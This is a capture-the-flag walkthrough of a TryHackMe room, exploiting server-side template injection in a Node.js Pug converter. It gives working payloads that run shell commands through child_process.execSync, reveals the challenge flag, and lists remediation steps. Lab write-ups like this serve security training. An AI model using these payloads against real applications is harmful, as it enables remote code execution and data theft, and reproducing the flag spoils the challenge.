# TryHackMe Challenge: Templates Walkthrough

## Challenge Overview
- **Target:** http://10.48.179.65:5000
- **Goal:** Hack the application and uncover the flag.
- **Vulnerability Type:** Server-Side Template Injection (SSTI)
- **Technology Stack:** Node.js, Express, Pug Templating Engine

## Initial Reconnaissance
A port scan of the target revealed two open ports:
- **Port 22:** SSH
- **Port 5000:** HTTP (Node.js/Express)

Visiting the web application on port 5000 showed a "PUG to HTML Converter" interface. This application allows users to input Pug template code and see the rendered HTML output.

## Vulnerability Analysis
The application takes user-provided Pug templates and renders them on the server. If the application does not properly sanitize the input, it may be vulnerable to **Server-Side Template Injection (SSTI)**.

### Testing for SSTI
I first tested for mathematical evaluation using the following Pug syntax:
```pug
h1= 7*7
```
The application rendered `<h1>49</h1>`, confirming that code within the template is being executed on the server.

## Exploitation
Since Pug is a JavaScript-based templating engine running on Node.js, I attempted to gain Remote Code Execution (RCE) by accessing the `process` object and the `child_process` module.

### Identifying the Flag
I executed a directory listing using the following payload:
```pug
h1= process.mainModule.require('child_process').execSync('ls').toString()
```
The output revealed a file named `flag.txt` in the application root directory.

### Retrieving the Flag
I then read the contents of `flag.txt` with this payload:
```pug
h1= process.mainModule.require('child_process').execSync('cat flag.txt').toString()
```

**Flag:** `flag{3cfca66f3611059a0dfbc4191a0803b2}`

## Remediation
To prevent SSTI vulnerabilities in applications using Pug or other templating engines:
1. **Never pass untrusted user input directly into a template engine's render function.**
2. Use a sandboxed environment if user-provided templates are necessary.
3. Implement strict input validation and sanitization.
4. Run the application with minimal privileges to limit the impact of RCE.
